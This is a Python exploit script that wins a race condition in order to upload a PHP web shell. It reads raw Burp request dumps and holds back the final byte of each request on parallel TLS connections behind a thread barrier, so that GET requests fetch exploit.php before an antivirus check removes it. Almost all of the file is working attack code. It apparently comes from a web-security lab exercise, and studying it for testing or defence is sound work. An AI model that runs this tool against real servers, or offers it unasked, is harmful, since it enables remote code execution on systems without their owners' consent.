#!/usr/bin/env python3
"""
Web shell upload via race condition - exploit script.

Replicates the Turbo Intruder "gate" technique in pure Python:
  - request1 (POST upload of exploit.php)     <- read from uploadReq.txt
  - request2 (GET  /files/avatars/exploit.php) <- read from imageReq.txt

All connections send everything except their final byte, wait on a shared
barrier, then release the last byte at (nearly) the same instant. The POST
writes the malicious file to disk; the GETs try to fetch it in the small
window after it is written but before the AV check deletes it.

Responses are written to response.txt, separated by a divider line.
"""

import os
import socket
import ssl
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
UPLOAD_REQ = os.path.join(HERE, "uploadReq.txt")
IMAGE_REQ = os.path.join(HERE, "imageReq.txt")
RESPONSES_DIR = os.path.join(HERE, "responses")
OUTPUT = os.path.join(RESPONSES_DIR, f"response-{time.strftime('%Y%m%d-%H%M%S')}.txt")

NUM_GET = 5
DEFAULT_PORT = 443
DIVIDER = "-" * 50


def parse_request(path):
    """Parse a raw Burp request dump into (host, port, request_bytes).

    Normalises line endings to CRLF, downgrades HTTP/2 -> HTTP/1.1, forces
    Connection: close for clean reads, and recomputes Content-Length so it
    matches the bytes we actually send.
    """
    with open(path, "r", newline="") as f:
        raw = f.read().replace("\r\n", "\n").strip("\n")

    if "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""

    head_lines = head.split("\n")
    request_line = head_lines[0].replace("HTTP/2", "HTTP/1.1")
    headers = head_lines[1:]

    host = None
    port = DEFAULT_PORT
    for h in headers:
        if h.lower().startswith("host:"):
            host = h.split(":", 1)[1].strip()
            if ":" in host:
                host, port_str = host.rsplit(":", 1)
                port = int(port_str)
            break
    if host is None:
        raise ValueError(f"No Host header found in {path}")

    body_bytes = body.replace("\n", "\r\n").encode()

    keep = [
        h
        for h in headers
        if not h.lower().startswith(
            ("content-length:", "connection:", "accept-encoding:")
        )
    ]
    keep.append("Connection: close")
    keep.append("Accept-Encoding: identity")
    if body_bytes:
        keep.append(f"Content-Length: {len(body_bytes)}")

    request = (request_line + "\r\n" + "\r\n".join(keep) + "\r\n\r\n").encode()
    request += body_bytes
    return host, port, request


def make_tls_socket(host, port):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["http/1.1"])
    raw = socket.create_connection((host, port), timeout=15)
    return ctx.wrap_socket(raw, server_hostname=host)


def recv_all(sock, timeout=15):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
    except (socket.timeout, ssl.SSLError, OSError):
        pass
    return b"".join(chunks)


def race_once(jobs):
    """Run a single POST+GETs race. Returns a list of (label, resp) tuples."""
    barrier = threading.Barrier(len(jobs))
    results = [None] * len(jobs)
    lock = threading.Lock()

    def worker(idx, label, host, port, data):
        try:
            sock = make_tls_socket(host, port)
            sock.sendall(data[:-1])
            barrier.wait()
            sock.sendall(data[-1:])
            resp = recv_all(sock)
            sock.close()
        except Exception as exc:
            resp = f"[ERROR] {exc}".encode()
        with lock:
            results[idx] = (label, resp)

    threads = []
    for idx, (label, host, port, data) in enumerate(jobs):
        t = threading.Thread(target=worker, args=(idx, label, host, port, data))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return results


def write_results(results):
    os.makedirs(RESPONSES_DIR, exist_ok=True)
    with open(OUTPUT, "w", encoding="utf-8", errors="replace") as out:
        for label, resp in results:
            out.write(f"### {label}\n")
            out.write(resp.decode("utf-8", errors="replace"))
            if not resp.endswith(b"\n"):
                out.write("\n")
            out.write(DIVIDER + "\n")


def run():
    up_host, up_port, post_req = parse_request(UPLOAD_REQ)
    img_host, img_port, get_req = parse_request(IMAGE_REQ)

    jobs = [("POST upload", up_host, up_port, post_req)]
    for i in range(NUM_GET):
        jobs.append((f"GET fetch #{i + 1}", img_host, img_port, get_req))

    results = race_once(jobs)
    write_results(results)

    print(f"Responses written to {OUTPUT}")
    for label, resp in results:
        status = resp.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        print(f"  {label:14s} -> {status}")


if __name__ == "__main__":
    run()
